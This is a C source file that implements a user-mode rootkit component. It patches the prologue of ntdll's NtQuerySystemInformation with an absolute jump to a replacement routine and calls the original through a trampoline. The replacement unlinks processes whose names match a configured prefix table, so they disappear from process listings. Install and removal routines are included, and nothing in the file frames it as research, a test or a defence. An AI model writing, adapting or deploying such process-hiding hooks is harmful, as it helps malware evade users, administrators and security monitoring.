#include "hook.h"
#include "ntdefs.h"
#include "config_reader.h"
#include <windows.h>
#include <string.h>

#define PATCH_SIZE  16
#define TRAMP_SIZE  32
#define JMP_SIZE    12

static PrefixTable          *g_table     = NULL;
static NtQuerySystemInformation_t g_original = NULL;
static NtQuerySystemInformation_t g_trampoline = NULL;
static BYTE                  g_saved[PATCH_SIZE];

static NTSTATUS NTAPI HookedNtQuerySystemInformation(
    ULONG  SystemInformationClass,
    PVOID  SystemInformation,
    ULONG  SystemInformationLength,
    PULONG ReturnLength)
{
    NTSTATUS status = g_trampoline(SystemInformationClass,
                                   SystemInformation,
                                   SystemInformationLength,
                                   ReturnLength);

    if (status != STATUS_SUCCESS ||
        SystemInformationClass != SYSTEM_PROCESS_INFORMATION_CLASS)
        return status;

    MY_SYSTEM_PROCESS_INFORMATION *prev = NULL;
    MY_SYSTEM_PROCESS_INFORMATION *curr =
        (MY_SYSTEM_PROCESS_INFORMATION *)SystemInformation;

    for (;;) {
        int hide = 0;
        if (curr->ImageName.Buffer != NULL && curr->ImageName.Length > 0)
            hide = prefix_matches(g_table, curr->ImageName.Buffer);

        if (hide && prev != NULL) {
            if (curr->NextEntryOffset == 0)
                prev->NextEntryOffset = 0;
            else
                prev->NextEntryOffset += curr->NextEntryOffset;
        } else {
            prev = curr;
        }

        if (curr->NextEntryOffset == 0)
            break;
        curr = (MY_SYSTEM_PROCESS_INFORMATION *)
               ((BYTE *)curr + curr->NextEntryOffset);
    }

    return status;
}

static void write_abs_jmp(BYTE *buf, void *target)
{
    buf[0] = 0x48;
    buf[1] = 0xB8;
    *(UINT_PTR *)(buf + 2) = (UINT_PTR)target;
    buf[10] = 0xFF;
    buf[11] = 0xE0;
}

int hook_install(PrefixTable *table)
{
    g_table = table;

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return -1;

    g_original = (NtQuerySystemInformation_t)
        GetProcAddress(ntdll, "NtQuerySystemInformation");
    if (!g_original) return -1;

    memcpy(g_saved, (void *)g_original, PATCH_SIZE);

    g_trampoline = (NtQuerySystemInformation_t)
        VirtualAlloc(NULL, TRAMP_SIZE,
                     MEM_COMMIT | MEM_RESERVE,
                     PAGE_EXECUTE_READWRITE);
    if (!g_trampoline) return -1;

    memcpy((void *)g_trampoline, g_saved, PATCH_SIZE);
    write_abs_jmp((BYTE *)g_trampoline + PATCH_SIZE,
                  (BYTE *)g_original + PATCH_SIZE);

    DWORD oldProt;
    if (!VirtualProtect((void *)g_original, PATCH_SIZE,
                        PAGE_EXECUTE_READWRITE, &oldProt)) {
        VirtualFree((void *)g_trampoline, 0, MEM_RELEASE);
        return -1;
    }

    write_abs_jmp((BYTE *)g_original,
                  (void *)HookedNtQuerySystemInformation);

    DWORD tmp;
    VirtualProtect((void *)g_original, PATCH_SIZE, oldProt, &tmp);

    return 0;
}

void hook_remove(void)
{
    if (!g_original) return;

    DWORD oldProt;
    if (!VirtualProtect((void *)g_original, PATCH_SIZE,
                        PAGE_EXECUTE_READWRITE, &oldProt))
        return;

    memcpy((void *)g_original, g_saved, PATCH_SIZE);

    DWORD tmp;
    VirtualProtect((void *)g_original, PATCH_SIZE, oldProt, &tmp);

    if (g_trampoline) {
        VirtualFree((void *)g_trampoline, 0, MEM_RELEASE);
        g_trampoline = NULL;
    }
}
